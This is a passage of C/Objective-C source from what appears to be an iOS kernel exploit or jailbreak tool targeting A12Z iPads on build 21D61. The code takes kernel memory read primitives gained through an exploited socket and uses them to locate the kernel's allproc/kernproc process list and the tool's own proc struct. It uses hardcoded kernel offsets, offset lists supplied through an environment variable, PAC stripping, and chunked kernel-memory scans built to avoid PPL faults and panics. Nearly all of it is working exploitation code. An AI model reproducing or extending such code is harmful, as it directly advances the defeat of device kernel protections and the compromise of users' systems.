                    ro_task = pac_strip(ro_task_raw);
                    ro_task_ok = is_kptr(ro_task);
                }

                if (!ro_task_ok && !tro_task_ok) {
                    task_proof_misses++;
                    filelog_write("[ourproc] socket/tro fast path: pid match via bg=0x%x tro=0x%x pid_off=0x%x but no task proof",
                                  socket_bg_thread_offs[bi], thread_tro_offs[ti], pid_off);
                    continue;
                }

                if (pid_off != PROC_PID_OFFSET) {
                    filelog_write("[ourproc] socket/tro fast path: switching PID offset 0x%x -> 0x%x",
                                  PROC_PID_OFFSET, pid_off);
                    PROC_PID_OFFSET = pid_off;
                }

                filelog_write("[ourproc] socket/tro fast path SUCCESS: rw_pcb=0x%llx socket=0x%llx pcb_soff=0x%x thread=0x%llx tro=0x%llx proc=0x%llx task=0x%llx bg=0x%x tro_off=0x%x tro_proc_off=0x%x pid_off=0x%x",
                              rw_pcb, socket, chosen_pcb_socket_off, thread, tro, proc, ro_task_ok ? ro_task : tro_task,
                              socket_bg_thread_offs[bi], thread_tro_offs[ti], tro_proc_off, pid_off);
                return proc;
            }
            } /* pc loop */
        }
    }

    filelog_write("[ourproc] socket/tro fast path stats: socket_off=0x%x socket_ptr_rejects=%d socket_read_failures=%d bg_candidates=%llu tro_candidates=%llu thread_read_failures=%d thread_zero_reads=%d thread_rejects=%d tro_read_failures=%d tro_zero_reads=%d tro_rejects=%d proc_rejects=%d pid_misses=%d task_proof_misses=%d",
                  chosen_pcb_socket_off, socket_ptr_rejects, socket_read_failures, (unsigned long long)nbg, (unsigned long long)ntro, thread_read_failures, thread_zero_reads, thread_ptr_rejects, tro_read_failures, tro_zero_reads, tro_ptr_rejects, proc_ptr_rejects, pid_probe_misses, task_proof_misses);
    if (thread_zero_reads > 0) {
        filelog_write("[ourproc] socket/tro fast path: saw %d zero thread reads (last bg=0x%x)",
                      thread_zero_reads, last_thread_bg_off);
    }
    if (thread_ptr_rejects > 0) {
        filelog_write("[ourproc] socket/tro fast path: rejected %d thread pointers by ptr gate (last bg=0x%x raw=0x%llx stripped=0x%llx)",
                      thread_ptr_rejects, last_thread_bg_off, last_thread_raw_reject, last_thread_reject);
    }
    if (tro_zero_reads > 0) {
        filelog_write("[ourproc] socket/tro fast path: saw %d zero tro reads (last tro_off=0x%x)",
                      tro_zero_reads, last_tro_off);
    }
    if (tro_ptr_rejects > 0) {
        filelog_write("[ourproc] socket/tro fast path: rejected %d tro pointers by ptr gate (last tro_off=0x%x raw=0x%llx stripped=0x%llx)",
                      tro_ptr_rejects, last_tro_off, last_tro_raw_reject, last_tro_reject);
    }
    if (proc_ptr_rejects > 0) {
        filelog_write("[ourproc] socket/tro fast path: rejected %d proc pointers by ptr gate (last raw=0x%llx stripped=0x%llx)",
                      proc_ptr_rejects, last_proc_raw_reject, last_proc_reject);
    }
    if (use_exact_upstream_21d61) {
        filelog_write("[ourproc] socket/tro fast path: targeted 21D61 path produced no validated self proc; falling back to allproc");
        return 0;
    }
    filelog_write("[ourproc] socket/tro fast path: no validated self proc found");
    return 0;
}

static uint64_t loadkernproc(void) {
    NSNumber *n = [[NSUserDefaults standardUserDefaults] objectForKey:kkernprocoffset];
    if (!n) return 0;
    return (uint64_t)n.unsignedLongLongValue;
}

static void savekernproc(uint64_t offset) {
    [[NSUserDefaults standardUserDefaults] setObject:@(offset) forKey:kkernprocoffset];
    [[NSUserDefaults standardUserDefaults] synchronize];
}

static bool try_allproc_candidate(const char *label, uint64_t kbase, uint64_t offset, bool persist_on_success, uint64_t *out_addr) {
    if (!offset) return false;

    uint64_t addr = kbase + offset;
    filelog_write("[allproc] trying %s offset 0x%llx -> addr 0x%llx", label, offset, addr);

    g_validate_curated = true; /* verbose logging for curated candidates */
    bool ok = validate_allproc(addr);
    g_validate_curated = false;
    if (!ok) {
        /* Bug #450: the curated/XPF-lite path previously only accepted true
         * allproc heads. On 21D61 the strongest remaining candidate
         * (kbase+0x3213680) behaves like a kernproc variable instead: *(cand)
         * decodes to PID 0 with NULL le_next and a heap le_prev backlink.
         * Reuse the already-hardened kernproc detector here so curated/XPF
         * candidates can succeed even when disc_pl rejects them as allproc. */
        if (detect_kernproc_variable(addr)) {
            filelog_write("[allproc] Bug #450: %s accepted via kernproc-direct fallback", label);
            ok = true;
        } else {
            filelog_write("[allproc] %s validation failed", label);
            return false;
        }
    }

    filelog_write("[allproc] %s validated ✓", label);
    g_kernproc_addr = addr;
    if (persist_on_success) {
        savekernproc(offset);
    }
    if (out_addr) {
        *out_addr = addr;
    }
    return true;
}

/* Bug #297: XPF-lite fallback.
 * Accept a comma/semicolon/space-separated list of offsets via DS_XPF_OFFSETS,
 * e.g. "0x31FFF30,0x3213678". This allows feeding offline patchfinder results
 * without enabling risky broad scans. Values can be either offsets or absolute
 * kernel addresses (kptr), absolute values are converted to offsets by kbase. */
static const char *builtin_xpf_offsets_for_os(void) {
    char build[32] = {0};
    if (!get_os_build(build, sizeof(build))) {
        return NULL;
    }

    if (strcmp(build, "21D61") == 0) {
        /* Bug #425: Align builtin XPF-lite order with latest offline shortlist
         * for 21D61 (v24/v-focused probe). Put 0x31FFF30 first: the focused
         * 21D61 offline probe sees it as the strongest exact allproc-like
         * target among the runtime shortlist. Keep 0x321C480 only as a late
         * runtime fallback to avoid early lock-in on non-allproc vars. */
        return "0x31FFF30,0x3213678,0x3213680,0x31C3000,0x3214850,0x3213EC8,0x321C480";
    }

    return NULL;
}

static uint64_t try_xpf_lite_offsets(uint64_t kbase) {
    const char *env_raw = getenv("DS_XPF_OFFSETS");
    const char *raw = env_raw;
    bool using_builtin = false;

    if (!raw || raw[0] == '\0') {
        raw = builtin_xpf_offsets_for_os();
        using_builtin = (raw && raw[0] != '\0');
    }
    if (!raw || raw[0] == '\0') {
        return 0;
    }

    char *work = strdup(raw);
    if (!work) {
        filelog_write("[allproc] Bug #297: DS_XPF_OFFSETS alloc failed");
        return 0;
    }

    if (using_builtin) {
        filelog_write("[allproc] Bug #297: trying builtin XPF-lite offsets for this OS build=%s", raw);
    } else {
        filelog_write("[allproc] Bug #297: trying XPF-lite offsets from DS_XPF_OFFSETS=%s", raw);
    }

    uint64_t found = 0;
    int parsed = 0;
    int tried = 0;

    for (char *tok = strtok(work, ",; "); tok != NULL; tok = strtok(NULL, ",; ")) {
        while (*tok == '\t') tok++;
        if (*tok == '\0') continue;

        char *endp = NULL;
        uint64_t val = strtoull(tok, &endp, 0);
        if (endp == tok) {
            filelog_write("[allproc] Bug #297: skip unparsable token '%s'", tok);
            continue;
        }

        parsed++;
        uint64_t off = val;
        if (is_kptr(val)) {
            if (val < kbase) {
                filelog_write("[allproc] Bug #297: skip absolute token below kbase: 0x%llx", val);
                continue;
            }
            off = val - kbase;
        }
        if (off == 0 || off > 0x10000000ULL) {
            filelog_write("[allproc] Bug #297: skip out-of-range offset 0x%llx", off);
            continue;
        }

        tried++;
        if (try_allproc_candidate("xpf-lite", kbase, off, false, &found)) {
            filelog_write("[allproc] Bug #297: XPF-lite SUCCESS at offset 0x%llx", off);
            break;
        }
    }

    if (!found) {
        filelog_write("[allproc] Bug #297: XPF-lite exhausted (parsed=%d tried=%d)", parsed, tried);
    }

    free(work);
    return found;
}

/* Validate if addr looks like allproc: it should point to a chain of 
 * proc structs where we can find PID=0 (kernel_task) */
static bool validate_allproc(uint64_t allproc_addr) {
    uint64_t head = 0;
    bool loud = g_validate_curated || (g_validate_verbose_count < 3);
    const uint64_t PROC_NEAR_PCB_MAX_DIFF = 0xC0000000ULL; /* Bug #398: 3 GB */
    const uint64_t PROC_BSD_BACKLINK_MAX_DIFF = 0x500000000ULL; /* Bug #440: 20 GB — accommodate full 24 GB zone_map span */
    bool result = false;
    int layout_score = 0;

    if (is_candidate_blacklisted(allproc_addr)) {
        if (loud) filelog_write("[val_ap] FAIL: candidate 0x%llx is blacklisted", allproc_addr);
        return false;
    }

    /* Step 1: read the pointer stored at allproc_addr */
    if (!kread64_checked_local(allproc_addr, &head)) {
        if (loud) filelog_write("[val_ap] FAIL: kread64 rejected addr 0x%llx", allproc_addr);
        g_validate_verbose_count++;
        return false;
    }
    if (loud) {
        filelog_write("[val_ap] addr=0x%llx raw_head=0x%llx stripped=0x%llx heap=%d",
                      allproc_addr, head, pac_strip(head), (int)is_heap_ptr(pac_strip(head)));
    }

    if (is_failed_allproc_head(pac_strip(head))) {
        if (loud) {
            filelog_write("[val_ap] Bug #430: skipping blacklisted failed head=0x%llx",
                          pac_strip(head));
        }
        g_validate_verbose_count++;
        return false;
    }

    /* Bug #237: reject immediately if *(allproc) is not a heap proc pointer.
     * Session 24 showed the old curated __DATA candidates still reaching
     * discover_proc_list_layout() with obvious non-heap heads like
     * 0xfffffff0240d2bd4, after which the device disconnected before the new
     * aligned scan window was even attempted. */
    /* Bug #445: allproc head may be in zone_map but below zone_safe_min (e.g.
     * XPF-resolved head near rw_socket_pcb which lives in the lower GEN1+ region).
     * Accept any address that is in the full zone_map range, not just >= safe_min. */
    if (!is_heap_ptr_relaxed(pac_strip(head)) && !is_in_zone_map(pac_strip(head))) {
        if (loud) filelog_write("[val_ap] FAIL: head is not a heap proc pointer (not relaxed-heap, not zone-map)");
        g_validate_verbose_count++;
        return false;
    }

    /* Bug #305/#306/#307/#309: reject clearly non-proc heads before deep layout discovery.
     * Session 25f showed a false XPF-lite candidate whose *(allproc) pointed at
     * a zone object near 0xffffffe21ca1b740. The later panic hit +0x8 of that
     * same object, which matches the first deep-layout diagnostic reads. Before
     * running discover_proc_list_layout(), require that the head already looks
     * like either:
     *   - proc_base           => pid at head + 0x60 is plausible, or
     *   - proc_base + 0xb0    => pid at (head - 0xb0) + 0x60 is plausible.
     * This keeps obvious non-proc zone objects out of disc_pl entirely. */
    {
        uint64_t head_stripped = pac_strip(head);
        /* Bug #398: Per-CPU false heads in GEN3 can pass heap-range checks
         * but panic on deeper dereference ("zone bound checks: per-cpu").
         * Real proc chain heads stay reasonably close to rw_socket_pcb in
         * zone_map on our target device; reject far heads early. */
        uint64_t rw_pcb = ds_get_rw_socket_pcb();
        if (rw_pcb) {
            uint64_t diff = (head_stripped > rw_pcb)
                          ? (head_stripped - rw_pcb)
                          : (rw_pcb - head_stripped);
            if (diff > PROC_NEAR_PCB_MAX_DIFF) {
                bool allow_far_bsd_backlink = false;
                uint64_t p_list_prev = 0;
                bool p_list_prev_ok = kread64_checked_local(head_stripped + 0x08, &p_list_prev);
                if (p_list_prev_ok && pac_strip(p_list_prev) == allproc_addr &&
                    diff <= PROC_BSD_BACKLINK_MAX_DIFF) {
                    allow_far_bsd_backlink = true;
                }
                /* Bug #446: if the allproc head is within the known zone_map, its
                 * distance from rw_pcb is irrelevant — proc structs can be anywhere
                 * in the 24 GB zone range.  Only reject if it is outside zone_map too. */
                bool allow_zone_map_head = is_in_zone_map(head_stripped);
                if (!allow_far_bsd_backlink && !allow_zone_map_head) {
                    if (loud) {
                        filelog_write("[val_ap] Bug #398: rejecting far head=0x%llx (rw_pcb=0x%llx diff=0x%llx, not in zone_map)",
                                      head_stripped, rw_pcb, diff);
                    }
                    g_validate_verbose_count++;
                    return false;
                }
                if (allow_zone_map_head && !allow_far_bsd_backlink && loud) {
                    filelog_write("[val_ap] Bug #446: allowing zone-map head despite rw_pcb dist "
                                  "(head=0x%llx diff=0x%llx within zone_map)",
                                  head_stripped, diff);
                }
                if (loud) {
                    filelog_write("[val_ap] Bug #402: allowing far head via BSD backlink "
                                  "(head=0x%llx prev=0x%llx allproc=0x%llx diff=0x%llx)",
                                  head_stripped, pac_strip(p_list_prev), allproc_addr, diff);
                }
            }
        }

        uint32_t direct_pid = 0, smrq_pid = 0;
        bool direct_links_ok = false;
        bool direct_ok = kread32_checked_local(head_stripped + PROC_PID_OFFSET, &direct_pid)
                      && is_plausible_pid(direct_pid);
        bool smrq_ok = false;
        bool smrq_links_ok = false;
        if (direct_ok) {
            /* Bug #307: a random data.kalloc object can still expose a small
             * value at head+pid_off by coincidence.  Fresh session 25f false
             * head 0xffffffe3fbe0b400 passed the direct pid check with
             * pid=0x6e65, but its first two qwords were already obviously not
             * a proc/list head: [raw+0]=0x800000fa22000000, [raw+8]=0.
             * Require at least one of the first two qwords to look like a
             * real heap proc-link before allowing the direct proc_base path. */
            uint64_t q0 = 0, q8 = 0;
            bool q0_ok = false, q8_ok = false;
            direct_links_ok = staged_head_has_heap_link(head_stripped, &q0, &q0_ok,
                                                        &q8, &q8_ok);
            if (!direct_links_ok && loud) {
                filelog_write("[val_ap] Bug #307: rejecting fake direct head=0x%llx "
                              "(q0=0x%llx ok=%d q8=0x%llx ok=%d)",
                              head_stripped, q0, (int)q0_ok, q8, (int)q8_ok);
            }
            direct_ok = direct_links_ok;
        }
        if (head_stripped >= 0xb0) {
            uint64_t maybe_base = head_stripped - 0xb0;
            if (is_heap_ptr_relaxed(maybe_base)) {
                /* Bug #306: a random zone object can still expose a small value at
                 * (head-0xb0)+pid_off by coincidence.  When treating head as a
                 * proc_base+0xb0 entry, require that the entry itself also looks
                 * like a real linked-list node: at least one of its first two
                 * qwords must be a non-zero kernel pointer after PAC stripping.
                 * Fresh session 25f false head 0xffffffe848901200 failed exactly
                 * here: [raw+0]=0x800000fa22000000 (non-kptr), [raw+8]=0.
                 * Bug #309: do this structural guard BEFORE reading
                 * (head-0xb0)+pid_off. Session 25f fresh false head
                 * 0xffffffe2003d87d0 produced a panic exactly at
                 * (head-0xb0)+0x60 = head-0x50 = 0xffffffe2003d8780. */
                uint64_t q0 = 0, q8 = 0;
                bool q0_ok = false, q8_ok = false;
                smrq_links_ok = staged_head_has_kptr_link(head_stripped, &q0, &q0_ok,
                                                          &q8, &q8_ok);
                if (!smrq_links_ok) {
                    if (loud) {
                        filelog_write("[val_ap] Bug #306: rejecting fake smrq head=0x%llx "
                                      "(q0=0x%llx ok=%d q8=0x%llx ok=%d)",
                                      head_stripped, q0, (int)q0_ok, q8, (int)q8_ok);
                    }
                } else {
                    smrq_ok = kread32_checked_local(maybe_base + PROC_PID_OFFSET, &smrq_pid)
                           && is_plausible_pid(smrq_pid);
                }
            }
        }
        if (!direct_ok && !(smrq_ok && smrq_links_ok)) {
            if (loud) {
                filelog_write("[val_ap] Bug #305: rejecting non-proc-looking head=0x%llx "
                              "(direct_pid_ok=%d pid=%u direct_links_ok=%d smrq_pid_ok=%d pid=%u smrq_links_ok=%d)",
                              head_stripped, (int)direct_ok, direct_pid, (int)direct_links_ok,
                              (int)smrq_ok, smrq_pid, (int)smrq_links_ok);
            }
            g_validate_verbose_count++;
            return false;
        }
    }

    ds_begin_proc_read_scope();

    uint64_t firstproc = 0;
    if (!discover_proc_list_layout(head, &firstproc)) {
        add_failed_allproc_head(pac_strip(head));
        if (loud) filelog_write("[val_ap] disc_layout FAILED head=0x%llx stripped=0x%llx",
                                head, pac_strip(head));
        g_validate_verbose_count++;
        goto out;
    }
    layout_score = g_last_disc_pl_score;

    if (reject_mixed_bsd_head_candidate(allproc_addr, firstproc)) {
        g_validate_verbose_count++;
        goto out;
    }

    bool ok = validate_proc_chain(firstproc, PROC_LIST_OFFSET, 200);
    if (!ok && loud)
        filelog_write("[val_ap] proc_chain FAILED firstproc=0x%llx", firstproc);
    if (ok) {
        pid_t ourpid = getpid();
        if (ourpid > 1) {
            uint32_t main_max_pid = 0;
            int main_steps = 0;
            uint64_t main_hit = walk_proc_chain_for_pid(firstproc, allproc_addr,
                                                        PROC_LIST_OFFSET, PROC_NEXT_OFFSET,
                                                        PROC_PID_OFFSET, ourpid, 4000,
                                                        &main_max_pid, &main_steps);
            uint32_t best_max_pid = main_max_pid;
            int best_steps = main_steps;

            if (!main_hit) {
                uint32_t alt_pid_off = (PROC_PID_OFFSET == 0xd8) ? 0x60 : 0xd8;
                if (alt_pid_off && alt_pid_off != PROC_PID_OFFSET) {
                    uint32_t alt_max_pid = 0;
                    int alt_steps = 0;
                    uint64_t alt_hit = walk_proc_chain_for_pid(firstproc, allproc_addr,
                                                               PROC_LIST_OFFSET, PROC_NEXT_OFFSET,
                                                               alt_pid_off, ourpid, 4000,
                                                               &alt_max_pid, &alt_steps);
                    if (alt_hit) {
                        if (loud) {
                            filelog_write("[val_ap] Bug #394: ourpid=%d reachable only with alternate pid_off=0x%x (was 0x%x)",
                                          (int)ourpid, alt_pid_off, PROC_PID_OFFSET);
                        }
                        PROC_PID_OFFSET = alt_pid_off;
                        main_hit = alt_hit;
                        best_max_pid = alt_max_pid;
                        best_steps = alt_steps;
                    } else {
                        if (alt_max_pid > best_max_pid) best_max_pid = alt_max_pid;
                        if (alt_steps > best_steps) best_steps = alt_steps;
                        if (loud) {
                            filelog_write("[val_ap] Bug #394: visible chain check miss: pid_off=0x%x max_pid=%u steps=%d alt_pid_off=0x%x alt_max_pid=%u alt_steps=%d ourpid=%d",
                                          PROC_PID_OFFSET, main_max_pid, main_steps,
                                          alt_pid_off, alt_max_pid, alt_steps, (int)ourpid);
                        }
                    }
                }
            }

            /* Bug #401: if layout discovery picked an interior proc sublist
             * (e.g. list_off=0xb0) and visible-chain gate rejects as partial,
             * try a bounded BSD-head fallback when firstproc advertises classic
             * LIST_HEAD backlink (firstproc+0x08 == allproc_addr). Accept only
             * if BSD geometry reaches ourpid and passes strict chain validation. */
            if (!main_hit && PROC_LIST_OFFSET != 0) {
                uint64_t p_list_prev = 0;
                if (kread64_checked_local(firstproc + 0x08, &p_list_prev) &&
                    pac_strip(p_list_prev) == allproc_addr) {
                    uint32_t bsd_pid_off = PROC_PID_OFFSET;
                    uint32_t bsd_max_pid = 0;
                    int bsd_steps = 0;
                    uint64_t bsd_hit = walk_proc_chain_for_pid(firstproc, allproc_addr,
                                                               0x0, 0x0,
                                                               bsd_pid_off, ourpid, 4000,
                                                               &bsd_max_pid, &bsd_steps);

                    if (!bsd_hit) {
                        uint32_t alt_pid_off = (bsd_pid_off == 0xd8) ? 0x60 : 0xd8;
                        if (alt_pid_off && alt_pid_off != bsd_pid_off) {
                            uint32_t alt_bsd_max_pid = 0;
                            int alt_bsd_steps = 0;
                            uint64_t alt_bsd_hit = walk_proc_chain_for_pid(firstproc, allproc_addr,
                                                                           0x0, 0x0,
                                                                           alt_pid_off, ourpid, 4000,
                                                                           &alt_bsd_max_pid, &alt_bsd_steps);
                            if (alt_bsd_hit) {
                                bsd_hit = alt_bsd_hit;
                                bsd_pid_off = alt_pid_off;
                                bsd_max_pid = alt_bsd_max_pid;
                                bsd_steps = alt_bsd_steps;
                            } else {
                                if (alt_bsd_max_pid > bsd_max_pid) bsd_max_pid = alt_bsd_max_pid;
                                if (alt_bsd_steps > bsd_steps) bsd_steps = alt_bsd_steps;
                            }
                        }
                    }

                    if (bsd_hit && validate_proc_chain_with_pid_off(firstproc, 0x0, bsd_pid_off, 200)) {
                        if (loud) {
                            filelog_write("[val_ap] Bug #401: BSD-head fallback recovered visible chain "
                                          "(list_off 0x%x->0x0 pid_off 0x%x->0x%x ourpid=%d steps=%d max_pid=%u)",
                                          PROC_LIST_OFFSET, PROC_PID_OFFSET, bsd_pid_off,
                                          (int)ourpid, bsd_steps, bsd_max_pid);
                        }
                        PROC_LIST_OFFSET = 0x0;
                        PROC_NEXT_OFFSET = 0x0;
                        PROC_PREV_OFFSET = 0x8;
                        PROC_PID_OFFSET = bsd_pid_off;
                        main_hit = bsd_hit;
                        best_max_pid = bsd_max_pid;
                        best_steps = bsd_steps;
                    } else if (loud) {
                        filelog_write("[val_ap] Bug #401: BSD-head fallback miss "
                                      "(hit=%d steps=%d max_pid=%u pid_off=0x%x)",
                                      (int)(bsd_hit != 0), bsd_steps, bsd_max_pid, bsd_pid_off);
                    }
                }
            }

            if (!main_hit && best_steps >= 16 && best_max_pid > 0 && best_max_pid < (uint32_t)ourpid) {
                uint32_t partial_accept_floor = (ourpid > 128) ? ((uint32_t)ourpid / 2U) : 64U;
                bool strong_structural_partial =
                    (layout_score >= 40) &&
                    (best_steps >= 32) &&
                    (best_max_pid >= partial_accept_floor);

                if (!strong_structural_partial) {
                    if (loud) {
                        filelog_write("[val_ap] Bug #394: rejecting partial allproc 0x%llx -- visible chain stops below ourpid (max_pid=%u < %d, steps=%d, list_off=0x%x pid_off=0x%x score=%d)",
                                      allproc_addr, best_max_pid, (int)ourpid, best_steps,
                                      PROC_LIST_OFFSET, PROC_PID_OFFSET, layout_score);
                    }
                    g_validate_verbose_count++;
                    goto out;
                }

                filelog_write("[val_ap] Bug #435: accepting strong structural partial allproc 0x%llx for safe ourproc retry/fallback (score=%d steps=%d max_pid=%u ourpid=%d list_off=0x%x pid_off=0x%x)",
                              allproc_addr, layout_score, best_steps, best_max_pid,
                              (int)ourpid, PROC_LIST_OFFSET, PROC_PID_OFFSET);
            }
        }
    }
    if (ok) {
        g_validate_verbose_count = 0; /* reset on success */
        result = true;
    } else {
        g_validate_verbose_count++;
    }

out:
    ds_end_proc_read_scope();
    return result;
}

/* ================================================================
   Logging helper for scan_for_allproc (printf goes to stderr only,
   klog_scan goes through the filelog so we can see results in the app)
   ================================================================ */
static void klog_scan(const char *fmt, ...) __attribute__((format(printf,1,2)));
static void klog_scan(const char *fmt, ...) {
    char buf[512]; va_list ap;
    va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    fprintf(stderr, "(allproc) %s\n", buf);
    /* Re-use the kfs log callback if available, else fall through */
    extern void filelog_write(const char *fmt, ...) __attribute__((format(printf,1,2)));
    filelog_write("[allproc] %s", buf);
}

/* Scan a single memory range for allproc.
 * SAFETY: Do NOT speculatively dereference every kptr found in data pages!
 * Only call validate_allproc() which reads from the known-safe data segment
 * first, then validates with is_heap_ptr before any heap dereference. */
static uint64_t scan_range_for_allproc(uint64_t range_start, uint64_t range_size, uint64_t kbase) {
    const uint64_t scan_chunk_size = 0x4000ULL;
    int candidates_tried = 0;
    int slot_read_failures = 0;
    int slot_read_failures_total = 0;
    int chunks_scanned = 0;
    /* Bug #236: never align DOWN and read before the requested window.
     * Session 23 showed __DATA.__bss scan requested start 0x...6f000, but the
     * helper read the preceding 16KB chunk at 0x...6c000 due to align-down.
     * That pre-range page can belong to a different / unsafe kernel region and
     * may trigger a disconnect or panic before validation even begins.
     *
     * Start at the first FULL 16KB page fully inside the requested range.
     * All targeted scan windows below are now intentionally 16KB-aligned. */
    uint64_t aligned_start = (range_start + scan_chunk_size - 1) & ~(scan_chunk_size - 1);
    uint64_t range_end = range_start + range_size;
    uint64_t aligned_end = (range_end + scan_chunk_size - 1) & ~(scan_chunk_size - 1);

    if (aligned_start >= aligned_end) {
        return 0;
    }

    /* Bug #239: Canary read — verify the kread primitive can access
     * this range before starting the expensive 16KB bulk scan.
     * Session 25b showed that a single 16KB chunk read at kbase+0x31FC000
     * caused kernel panic (copyout fault) on certain boots.
     * A single 8-byte read is much safer: if it fails, we skip the
     * entire range instead of triggering a kernel panic. */
    {
        uint64_t canary = 0;
        if (!ds_kread64_checked(aligned_start, &canary)) {
            klog_scan("canary read FAILED at range start 0x%llx -- skipping entire range",
                      aligned_start);
            return 0;
        }
        klog_scan("canary read OK at 0x%llx (val=0x%llx)", aligned_start, canary);
    }

    /* Scan in 16KB chunks aligned to the device kernel page size.
     * Bug #271: avoid 16KB bulk reads during speculative scans.
     * Even checked bulk reads can still provoke kernel aborts on some boots
     * before getsockopt reports failure. Read each 8-byte slot directly from
     * kernel instead: slower, but materially safer for unstable sessions. */
    for (uint64_t addr = aligned_start; addr < aligned_end; addr += scan_chunk_size) {
        if (chunks_scanned < 3) {
            klog_scan("reading scan chunk at 0x%llx", addr);
        }
        chunks_scanned++;
        
        for (int j = 0; j < 0x4000; j += 8) {
            uint64_t val = 0;
            uint64_t candidate = addr + (uint64_t)j;
            if (candidate < range_start || candidate >= range_end) continue;

            if (!ds_kread64_checked(candidate, &val)) {
                slot_read_failures++;
                slot_read_failures_total++;
                if (slot_read_failures_total <= 3) {
                    klog_scan("slot read failed at 0x%llx during allproc scan", candidate);
                }
                if (slot_read_failures >= 64) {
                    klog_scan("aborting range 0x%llx after %d consecutive slot-read failures",
                              range_start, slot_read_failures);
                    return 0;
                }
                continue;
            }
            slot_read_failures = 0;

            uint64_t stripped = pac_strip(val);
            /* allproc value is a HEAP pointer (to first proc struct).
             * Skip text/data/const segment pointers — they can't be proc ptrs.
             * This is the KEY safety filter that prevents panic.
             * NOTE: is_heap_ptr now correctly excludes 0xffffffffffffffff (-1)
             * and the entire 0xfffffff0... kernel text/data range. */
            if (!is_heap_ptr(stripped)) continue;

            /* QUICK PRE-FILTER (2 kernel reads) to avoid expensive full
             * validate_allproc (which costs ~200 reads per false candidate):
             *
             * allproc = pointer to first proc struct.
             * *(allproc) must be a heap ptr to the kernel proc (pid 0).
             * If pid at *(allproc) + PROC_PID_OFFSET is not 0, skip fast.
             *
             * This reduces per-false-candidate cost from ~200 to 2 reads,
             * cutting total scan time from ~23s to ~2s.
             *
             * Bug #216 SAFETY: the pid read from first_q is a HEAP read.
             * With emergency zone bounds (±8GB), some heap-looking addresses
             * may actually be zone metadata (unmapped) → kernel panic.
             * Limit total HEAP reads to 50 to minimize risk. */
            uint64_t head_q = val;
            uint64_t first_q = pac_strip(head_q);
            if (!is_heap_ptr(first_q)) continue;  /* allproc → heap proc ptr */

            /* Bug #216: additional sanity — proc structs are in zone_map.      *
             * Check that first_q is within zone_map width (24 GB) of rw_pcb.   *
             * Use 16 GB (emergency window width) as the tolerance.               *
             * Bug #219: old 2 GB limit was too tight — kernproc can be >2 GB    *
             * away from rw_socket_pcb in zone_map on A12Z with zone KASLR.      */
            uint64_t rw_pcb = ds_get_rw_socket_pcb();
            if (rw_pcb) {
                uint64_t diff = (first_q > rw_pcb) ? (first_q - rw_pcb) : (rw_pcb - first_q);
                /* Bug #398: tighten proximity gate from 16 GB to 3 GB.
                 * Session 26 showed per-cpu false heads around 0xffffffdff...
                 * that were ~3.8 GB away from rw_socket_pcb and led to
                 * zone-bound panic during scan validation. */
                if (diff > 0xC0000000ULL) { /* >3 GB away from pcb */
                    continue;
                }
            }

            uint32_t pid_q = 0;
            if (!ds_kread32_checked(first_q + PROC_PID_OFFSET, &pid_q)) continue;
            /* Bug #232: allproc head is the NEWEST proc (LIST_INSERT_HEAD),
             * NOT kernel_task. Accept any plausible pid, not just 0. */
            if (!is_plausible_pid(pid_q)) continue;

            /* Bug #232: Quick 5-step chain walk as pre-filter.
             * Try FORWARD via le_next (+0x00) first. If that gives < 3 procs,
             * try BACKWARD via le_prev (+0x08). This handles both:
             *  - allproc HEAD (newest proc → forward walk to tail)
             *  - kernproc/tail proc → backward walk to head
             * le_prev in BSD LIST_ENTRY points to &prev->le_next = prev proc base
             * (since le_next is at offset 0 in struct proc). */
            {
                int quick_ok = 0;
                /* Forward walk via le_next */
                uint64_t qc = first_q;
                for (int qs = 0; qs < 5 && is_heap_ptr(qc); qs++) {
                    uint32_t qpid = 0;
                    if (!ds_kread32_checked(qc + PROC_PID_OFFSET, &qpid)) break;
                    if (!is_plausible_pid(qpid)) break;
                    quick_ok++;
                    uint64_t qnext = 0;
                    if (!ds_kread64_checked(qc, &qnext)) break;  /* le_next at +0x00 */
                    qc = pac_strip(qnext);
                    if (!qc || qc == first_q) break;
                }
                /* If forward walk insufficient, try backward via le_prev */
                if (quick_ok < 3) {
                    int back_ok = 1;  /* count first_q itself (already verified pid) */
                    qc = first_q;
                    for (int qs = 0; qs < 5; qs++) {
                        uint64_t qprev = 0;
                        if (!ds_kread64_checked(qc + 0x08, &qprev)) break;  /* le_prev at +0x08 */
                        uint64_t prev = pac_strip(qprev);
                        if (!prev || !is_heap_ptr(prev) || prev == qc || prev == first_q) break;
                        uint32_t qpid = 0;
                        if (!ds_kread32_checked(prev + PROC_PID_OFFSET, &qpid)) break;
                        if (!is_plausible_pid(qpid)) break;
                        back_ok++;
                        qc = prev;
                    }
                    quick_ok = (back_ok > quick_ok) ? back_ok : quick_ok;
                }
                if (quick_ok < 3) continue;  /* need at least 3 consecutive procs */
            }

            /* validate_allproc only dereferences heap ptrs checked by is_heap_ptr */
            if (validate_allproc(candidate)) {
                klog_scan("allproc FOUND at 0x%llx (offset from kbase: 0x%llx)",
                          candidate, candidate - kbase);
                return candidate;
            }
            /* Limit total candidates to avoid excessive kernel reads.
             * Bug #219: raised from 100 to 500 — inner __DATA.__common has many
             * heap-looking values that fail allproc validation. Need more budget. */
            if (++candidates_tried > 500) {
                klog_scan("too many candidates (%d), aborting range 0x%llx",
                          candidates_tried, range_start);
                return 0;
            }
        }
    }
    return 0;
}

/* Scan kernel memory for allproc.
 * SAFETY NOTES for arm64e (A12Z / iPad8,9):
 *   - __PPLDATA and __LASTDATA are PPL-protected: any read via exploit
 *     causes "Unexpected fault in kernel static region" kernel panic.
 *   - Strategy 1 (targeted scan around pcbinfo) is REMOVED: it scanned
 *     raw address ranges that could overlap PPL regions.
 *   - Only the FIRST 16 KB of kernel __DATA is scanned as a fallback.
 *     On this device/build the second 16 KB page of the reported __DATA
 *     segment faults in kernel static region.  allproc is expected very
 *     near the start of __DATA (__DATA + 0x60 legacy candidate), so this
 *     conservative fallback avoids panics while still covering the likely
 *     runtime location.
 */
static uint64_t scan_for_allproc(void) {
    uint64_t kbase = ds_get_kernel_base();
    if (!kbase) return 0;

    /* PROC_PID_OFFSET is used in the quick pre-filter inside
     * scan_range_for_allproc. Make sure it is initialised. */
    if (!g_offsets_ready) init_offsets();

    /* Parse Mach-O header to locate __DATA segment address/size. */
    uint8_t hdr[4096];
    if (!ds_kread_checked(kbase, hdr, sizeof(hdr))) {
        klog_scan("failed to read kernel Mach-O header at 0x%llx", kbase);
        return 0;
    }
    uint32_t magic = *(uint32_t *)hdr;
    if (magic != 0xFEEDFACF) {
        klog_scan("bad kernel magic: 0x%x", magic);
        return 0;
    }

